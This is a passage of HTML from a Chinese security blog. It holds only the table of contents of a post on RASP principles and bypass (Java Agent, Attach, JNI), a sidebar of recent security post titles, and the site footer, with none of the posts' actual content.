href="#2-2-Java-Agent-%E7%9A%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2-2-Java Agent 的使用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1Demo"><span class="toc-number">2.2.1.</span> <span class="toc-text">2-2-1Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2%E7%BC%96%E8%AF%91%EF%BC%8B%E6%89%93%E5%8C%85"><span class="toc-number">2.2.2.</span> <span class="toc-text">2-2-2编译＋打包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Attach%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">2-2-Attach机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-Attach%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.3.1.</span> <span class="toc-text">2-2-1 Attach是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-Attach%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.2.</span> <span class="toc-text">2-2-2 Attach实现原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-RASP%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">3-RASP绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-JNI%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">3-1-JNI绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-JNI%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.1.1.</span> <span class="toc-text">3-1-1 JNI实现</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B5%85%E8%B0%88RASP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/" title="浅谈RASP原理及绕过">浅谈RASP原理及绕过</a><time datetime="2026-05-22T10:42:04.000Z" title="发表于 2026-05-22 18:42:04">2026-05-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%96%B0%E6%89%8B%E7%B3%BB%E5%88%97--%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B/" title="新手系列--迷你天猫商城系统代码审计流程">新手系列--迷你天猫商城系统代码审计流程</a><time datetime="2025-12-26T13:26:21.000Z" title="发表于 2025-12-26 21:26:21">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E5%85%B3%E4%BA%8Ek8s%E6%94%BB%E9%98%B2%E7%9A%84%E9%9A%8F%E7%AC%94/" title="关于k8s攻防的随笔">关于k8s攻防的随笔</a><time datetime="2025-11-18T14:07:04.000Z" title="发表于 2025-11-18 22:07:04">2025-11-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1%E9%93%BE%E5%88%86%E6%9E%90/" title="java反序列化之cc1链分析">java反序列化之cc1链分析</a><time datetime="2025-11-08T07:43:28.000Z" title="发表于 2025-11-08 15:43:28">2025-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B5%85%E8%B0%88pyramid%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/" title="浅谈pyramid框架下的栈帧逃逸">浅谈pyramid框架下的栈帧逃逸</a><time datetime="2025-11-07T17:55:14.000Z" title="发表于 2025-11-08 01:55:14">2025-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Timind</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
